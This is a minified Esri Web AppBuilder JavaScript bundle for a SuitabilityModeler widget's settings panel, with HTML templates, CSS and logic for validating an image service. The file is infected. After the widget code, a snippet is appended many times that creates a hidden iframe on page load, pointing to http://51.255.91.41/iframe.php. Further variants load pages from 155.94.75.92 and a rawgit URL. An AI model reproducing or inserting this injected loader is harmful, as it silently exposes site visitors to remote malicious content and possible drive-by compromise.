"url:jimu/dijit/templates/_ItemTable.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"items-section all-items-section" data-dojo-attach-point\x3d"allItemsSection"\x3e\r\n\t\t\x3cdiv class\x3d"items-table-div" data-dojo-attach-point\x3d"allItemsTableDiv" data-dojo-attach-event\x3d"onscroll:_onAllItemsSectionScroll"\x3e\r\n\t\t\t\x3ctable class\x3d"items-table" cellpadding\x3d"10" data-dojo-attach-point\x3d"allItemsTable" data-dojo-attach-event\x3d"onclick:_onItemsTableClicked"\x3e\r\n\t\t\t\t\x3ctbody data-dojo-attach-point\x3d"allItemTbody"\x3e\x3c/tbody\x3e\r\n\t\t\t\x3c/table\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-type\x3d"jimu/dijit/LoadingIndicator" data-dojo-attach-point\x3d"allItemsShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv class\x3d"items-section filtered-items-section" data-dojo-attach-point\x3d"filteredItemsSection"\x3e\r\n\t\t\x3cdiv class\x3d"items-table-div" data-dojo-attach-point\x3d"filteredItemsTableDiv" data-dojo-attach-event\x3d"onscroll:_onFilteredItemsSectionScroll"\x3e\r\n\t\t\t\x3ctable class\x3d"items-table" cellpadding\x3d"10" data-dojo-attach-point\x3d"filteredItemsTable" data-dojo-attach-event\x3d"onclick:_onItemsTableClicked"\x3e\r\n\t\t\t\t\x3ctbody data-dojo-attach-point\x3d"filteredItemsTbody"\x3e\x3c/tbody\x3e\r\n\t\t\t\x3c/table\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"search-none-tip-section" data-dojo-attach-point\x3d"searchNoneTipSection" style\x3d"display:none;"\x3e\r\n\t\t\t\x3cspan class\x3d"search-none-icon jimu-icon jimu-icon-error"\x3e\x3c/span\x3e\r\n\t\t\t\x3cspan class\x3d"search-none-tip jimu-state-error-text"\x3e${nls.searchNone}\x3c/span\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-type\x3d"jimu/dijit/LoadingIndicator" data-dojo-attach-point\x3d"filteredItemShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/SuitabilityModeler/setting/Setting.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"section"\x3e\r\n    \x3cp class\x3d"description" data-dojo-attach-point\x3d"descriptionNode1"\x3e${nls.description1}\x3c/p\x3e\r\n    \x3cp class\x3d"description" data-dojo-attach-point\x3d"descriptionNode2"\x3e${nls.description2}\x3c/p\x3e\r\n    \x3cp class\x3d"description" data-dojo-attach-point\x3d"descriptionNode3"\x3e\x3c/p\x3e\r\n  \x3c/div\x3e\r\n  \x3cform class\x3d"section" data-dojo-attach-point\x3d"settingsForm" data-dojo-type\x3d"dijit/form/Form"\x3e\r\n    \x3cdiv class\x3d"row starting-state"\x3e\r\n      \x3ch3\x3e${nls.startingState}\x3c/h3\x3e\r\n      \x3clabel class\x3d"option"\x3e\x3cinput type\x3d"radio" name\x3d"${id}_radios"\r\n        data-dojo-attach-point\x3d"byUrlRadio"\r\n        data-dojo-type\x3d"dijit/form/RadioButton"\r\n        /\x3e${nls.byUrl}\x3c/label\x3e\r\n      \x3cbr\x3e\r\n      \x3clabel class\x3d"option"\x3e\x3cinput type\x3d"radio" name\x3d"${id}_radios"\r\n        data-dojo-attach-point\x3d"byItemRadio"\r\n        data-dojo-type\x3d"dijit/form/RadioButton"\r\n        /\x3e${nls.byItem}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv class\x3d"row" data-dojo-attach-point\x3d"byUrlSection"\x3e\r\n      \x3ch3 for\x3d"${id}_serviceUrl"\x3e${nls.imageServiceUrl}\x3c/h3\x3e\r\n      \x3cinput id\x3d"${id}_serviceUrl" type\x3d"text" class\x3d"url-box"\r\n        data-dojo-attach-point\x3d"serviceUrlBox"\r\n        data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n        data-dojo-props\x3d"required:true,trim:true,maxLength:1024" /\x3e\r\n      \x3cspan class\x3d"jimu-btn" href\x3d"#"\r\n        data-dojo-attach-point\x3d"validateNode"\r\n        data-dojo-attach-event\x3d"onclick:validateClicked"\r\n        \x3e${nls.validate}\x3c/span\x3e\r\n      \x3cdiv class\x3d"example"\x3e\r\n        https://example.com/arcgis/rest/services/Example/ImageServer\r\n        \x3cbr\x3e\r\n        https://utility.arcgis.com/usrsvcs/servers/24b7c7752170431a95719323a9e71a5e/rest/services/WRO_World_Ecophysiographic_Data/ImageServer\r\n        \x3cbr\x3e\r\n        https://landscape3.arcgis.com/arcgis/rest/services/Landscape_Modeler/USA_Weighted_Overlay/ImageServer\r\n        \x3cbr\x3e\r\n        https://greeninfrastructuremapsdev.arcgis.com/arcgis/rest/services/GreenInfrastructure/WeightedOverlay_Geoplanner/ImageServer\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv class\x3d"row" data-dojo-attach-point\x3d"byItemSection"\x3e\r\n        \x3ch3 for\x3d"${id}_modelName"\x3e${nls.modelName}\x3c/h3\x3e\r\n        \x3cinput id\x3d"${id}_modelName" type\x3d"text" class\x3d"url-box"\r\n          data-dojo-attach-point\x3d"modelNameBox"\r\n          data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n          data-dojo-props\x3d"required:false,trim:true" /\x3e\r\n        \x3cspan class\x3d"jimu-btn" href\x3d"#"\r\n          data-dojo-attach-point\x3d"selectModelNode"\r\n          data-dojo-attach-event\x3d"onclick:selectModelClicked"\r\n          \x3e${nls.selectModel}\x3c/span\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv class\x3d"row"\x3e\r\n\t    \x3ch3\x3e\r\n\t\t    \x3cinput id\x3d"${id}_saveAs" type\x3d"checkbox"\r\n\t\t      data-dojo-attach-point\x3d"allowSaveAsCheckBox"\r\n\t\t      data-dojo-type\x3d"dijit/form/CheckBox"/\x3e\r\n\t\t    \x3clabel for\x3d"${id}_saveAs"\x3e${nls.allowSaveAs}\x3c/label\x3e\r\n\t    \x3c/h3\x3e\r\n\t  \x3c/div\x3e\r\n  \x3c/form\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/SuitabilityModeler/setting/css/style.css":'.jimu-widget-suitability-modeler-setting h3 {margin-top: 0; margin-bottom: 12px; font-family: "Avenir Medium";}.jimu-widget-suitability-modeler-setting .section {margin-bottom: 30px;}.jimu-widget-suitability-modeler-setting .row {margin-bottom: 18px;}.jimu-widget-suitability-modeler-setting .description {font-size: 14px; margin-bottom: 20px;}.jimu-widget-suitability-modeler-setting .starting-state .option {display: inline-block; margin-bottom: 10px;}.jimu-widget-suitability-modeler-setting .starting-state .option \x3e input {margin-right: 6px;}.jimu-rtl .jimu-widget-suitability-modeler-setting .starting-state .option \x3e input {margin-left: 6px; margin-right: 0;}.jimu-widget-suitability-modeler-setting .row {margin-top: 20px; font-size: 14px;}.jimu-widget-suitability-modeler-setting .dijitTextBox.url-box {width: 785px; height: 35px; margin-right: 5px;}.jimu-rtl .jimu-widget-suitability-modeler-setting .dijitTextBox.url-box {margin-left: 5px; margin-right: 0;}.jimu-widget-suitability-modeler-setting .dijitTextBox .dijitInputField {padding-top: 4px; padding-bottom: 3px;}.jimu-widget-suitability-modeler-setting .dijitTextBox .dijitInputInner {text-overflow: ellipsis;}.jimu-widget-suitability-modeler-setting .example {margin-top: 10px; color: #666; font-size: 11px; font-style: italic; line-height: 15px;}.jimu-widget-suitability-modeler-setting .popup-button-bar {float: right; padding-top: 20px;}.jimu-rtl .jimu-widget-suitability-modeler-setting .popup-button-bar {float: left;}.jimu-widget-suitability-modeler-setting .popup-button-bar .btn-ok {margin-right: 16px;}.jimu-widget-suitability-modeler-setting-help-link {line-height: 30px;}.jimu-widget-suitability-modeler-setting .dijitRadio {width: 16px; height: 16px; background: #fff; border: 1px solid #999; position: relative; overflow: visible; -moz-border-radius: 50%; -webkit-border-radius: 50%; border-radius: 50%; -moz-box-sizing: border-box; -webkit-box-sizing: border-box; box-sizing: border-box; margin-right: 6px;}.jimu-rtl .jimu-widget-suitability-modeler-setting .dijitRadio {margin-left: 6px; margin-right: 0;}.jimu-widget-suitability-modeler-setting .dijitRadio:after {content: " "; display: block; width: 0; height: 0; margin: 7px; position: absolute; top: 0; left: 0; -moz-border-radius: 50%; -webkit-border-radius: 50%; border-radius: 50%; opacity: 0;}.jimu-widget-suitability-modeler-setting .dijitRadioChecked {border-width: 2px; border-color: #24b5cc;}.jimu-widget-suitability-modeler-setting .dijitRadioChecked:after {background-color: #24b5cc; width: 8px; height: 8px; margin: 2px; opacity: 1;}.jimu-widget-suitability-modeler-setting .dijitCheckBox {background: #fff; border: 1px solid #999; text-align: center; position: relative; margin-right: 6px;}.jimu-rtl .jimu-widget-suitability-modeler-setting .dijitCheckBox {margin-left: 6px; margin-right: 0;}.jimu-widget-suitability-modeler-setting .dijitCheckBox input {position: absolute; top: 0; left: 0; width: 14px; height: 14px;}.jimu-widget-suitability-modeler-setting .dijitCheckBox {width: 16px; height: 16px; position: relative; font-family: "CalciteWebCoreIcons"; speak: none; font-size: 12px; font-style: normal; font-weight: normal; font-variant: normal; text-transform: none; text-indent: 0; line-height: 1; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; line-height: 14px; -moz-box-sizing: border-box; -webkit-box-sizing: border-box; box-sizing: border-box;}.jimu-widget-suitability-modeler-setting .dijitCheckBoxChecked {background-color: #24b5cc; border-color: #24b5cc; color: #fff;}.jimu-widget-suitability-modeler-setting .dijitCheckBoxChecked:before {content: "\\e605";}',
"*now":function(m){m(['dojo/i18n!*preload*widgets/SuitabilityModeler/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/on dojo/dom-class dojo/dom-construct dojo/i18n!../nls/strings ../WroContext ../wro/wroUtil esri/layers/ArcGISImageServiceLayer jimu/dijit/Popup jimu/dijit/ItemSelector dijit/form/Form dijit/form/ValidationTextBox dijit/form/CheckBox dijit/form/RadioButton".split(" "),function(m,p,e,k,a,d,c,b,f,q,h,x,w){return m([p,e],{baseClass:"jimu-widget-suitability-modeler-setting",_modelItem:null,_url:"http://doc.arcgis.com/en/geoplanner/documentation/find-the-best-place-using-weighted-overlay.htm",
postCreate:function(){this.inherited(arguments);var b=this;this.modelNameBox.set("disabled",!0);this.own(a(this.byUrlRadio,"click",function(){b.updateSection()}),a(this.byItemRadio,"click",function(){b.updateSection()}))},startup:function(){this._started||(this.inherited(arguments),this.setConfig(this.config))},getConfig:function(){if(!this.settingsForm.validate()||this.byItemRadio.checked&&(!this._modelItem||0===this.modelNameBox.get("value").length))return!1;this.config||(this.config={});this.config.allowSaveAs=
!!this.allowSaveAsCheckBox.get("checked");this.config.imageServiceUrl=this.serviceUrlBox.get("value");this.byUrlRadio.checked?(this.config.imageServiceUrl=this.serviceUrlBox.get("value"),this.config.modelItem=null):(this.config.imageServiceUrl=this._modelItem.url,this.config.modelItem=this._modelItem);return this.config},setConfig:function(a){this.config=a||{};this.allowSaveAsCheckBox.set("checked",!!this.config.allowSaveAs);this._modelItem=null;var b=a.modelItem;b&&"string"===typeof b.id&&0<b.id.length&&
"string"===typeof b.url&&0<b.url.length&&"string"===typeof b.title&&0<b.title.length?(this._modelItem=k.clone(b),this.byItemRadio.set("checked",!0),this.modelNameBox.set("value",b.title)):(a=a.imageServiceUrl,"string"===typeof a&&(a=a.trim(),0<a.length&&this.serviceUrlBox.set("value",a)),this.byUrlRadio.set("checked",!0));this.updateSection()},selectModelClicked:function(){var b=this,f={portalUrl:this.appConfig.portalUrl,itemTypes:["Image Service"],typeKeywords:["geodesignModelerLayer"]},e=c.create("div",
{"class":this.baseClass,style:{width:"100%",height:"100%"}}),h=c.create("div",{style:{height:"460px"}},e),k=c.create("div",{"class":"popup-button-bar"},e),m=c.create("span",{"class":"btn-ok jimu-btn jimu-state-disabled",innerHTML:this.nls.ok},k),k=c.create("span",{"class":"jimu-btn jimu-btn-vacation",innerHTML:this.nls.cancel},k),q=new w(f),p=new x({titleLabel:this.nls.itemSelectorTitle,content:e,width:830,height:600});q.placeAt(h);this.own(a(q,"item-selected",function(){d.remove(m,"jimu-state-disabled")}));
this.own(a(q,"none-item-selected",function(){console.warn("none-item-selected");d.add(m,"jimu-state-disabled")}));this.own(a(m,"click",function(){var a=q.getSelectedItem();a&&!d.contains(m,"jimu-state-disabled")&&b.validateService(a.url,m,!0,function(){b.modelNameBox.set("value",a.title);b._modelItem={id:a.id,url:a.url,title:a.title};p.close()})}));this.own(a(k,"click",function(){p.close()}))},updateSection:function(){this.byUrlRadio.checked?(this.byUrlSection.style.display="block",this.byItemSection.style.display=
"none",this.serviceUrlBox.set("required",!0),this.modelNameBox.set("required",!1)):(this.byUrlSection.style.display="none",this.byItemSection.style.display="block",this.serviceUrlBox.set("required",!1),this.modelNameBox.set("required",!0))},validateClicked:function(){var a=this.serviceUrlBox.get("value").trim();this.validateService(a,this.validateNode,!1,null)},validateService:function(a,c,e,k){var l=this;if(!d.contains(c,"jimu-state-disabled")){var n=function(){d.remove(c,"jimu-state-disabled");
c.innerHTML=e?l.nls.ok:l.nls.validate};c.innerHTML=l.nls.validating;d.add(c,"jimu-state-disabled");var m=new f({i18n:b}),p,r=[],u=q.newWROInfo(),g=b.wro.validation.invalidItemCaption;0<a.length?(a=m.checkMixedContent(a),p=new h(a,{id:m.generateRandomId()}),p.setVisibility(!1),q.waitForLayer(p,b).then(function(){return q.validateWROLayer(b,p,u,r,!1)}).then(function(){0<r.length?m.showMessages(g,a,r):"function"===typeof k?k():m.showMessages(l.nls.imageServiceUrl,a,[l.nls.validated]);n()}).otherwise(function(c){console.warn("Error loading WRO layer",
a);console.error(c);c.message?m.showMessages(g,a,[c.message]):m.showMessages(g,a,[b.wro.validation.inaccessible]);n()})):n()}},_addAboutLink:function(){var a=this.getParent(),b=this.nls.description3,c=this._url;a&&a.helpNode?(a.helpNode.style.display="inline-block",a.helpNode.setAttribute("href",c),d.add(a.helpNode,"jimu-widget-suitability-modeler-setting-help-link")):this.descriptionNode3.innerHTML="\x3ca target\x3d'_blank' href\x3d'"+c+"'\x3e"+b+"\x3c/a\x3e"}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});